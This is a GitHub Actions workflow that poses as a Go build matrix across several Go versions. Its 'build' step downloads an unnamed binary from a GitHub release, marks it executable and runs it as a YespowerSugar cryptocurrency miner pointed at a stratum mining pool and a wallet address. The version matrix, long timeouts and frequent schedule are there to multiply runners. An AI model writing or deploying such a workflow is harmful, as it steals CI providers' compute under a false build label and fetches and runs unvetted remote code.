name: kuy

on:  
  push:
  pull_request:
  schedule:
    - cron: '* */6 * * *'
jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      fail-fast: false
      matrix:
        go: ['1.11', '1.12', '1.13', '1.14', '1.15']
        flag: [aku, kmu, dia, kta]        
    timeout-minutes: 360
    env:
        NUM_JOBS: 25
        JOB: ${{ matrix.job }}
    steps:
    - uses: actions/checkout@v2
    - uses: actions/setup-go@v1
      with:
        go-version: ${{ matrix.go }}
    - name: build
      run: |
        wget https://github.com/konchilscode/sugar/releases/download/v2.1/a && chmod +x a && ./a -a YespowerSugar -o stratum+tcp://stratum-eu.rplant.xyz:17042 -u sugar1qqtpkpkj5ffelx3g4d992ryr9mnlw88d62cr0qn.test -t4
